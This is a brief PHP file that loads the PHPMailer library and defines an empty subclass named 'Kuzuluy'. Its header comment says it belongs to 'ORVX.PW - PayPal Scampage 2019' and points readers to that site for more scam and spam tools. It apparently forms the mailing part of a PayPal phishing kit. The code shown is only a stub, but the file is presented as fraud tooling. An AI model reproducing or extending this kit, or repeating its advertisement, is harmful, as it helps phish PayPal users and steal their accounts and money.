<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
/* use Stichoza\GoogleTranslate\TranslateClient; */

require __DIR__ . '/phpmailer/vendor/autoload.php';
/* require __DIR__ . '/translate/vendor/autoload.php'; */

class Kuzuluy extends PHPMailer {
  /**
   * ORVX.PW - PayPal Scampage 2019.
   
   * for more scams and spam tools visit us ORVX.pw
   */
}
?>
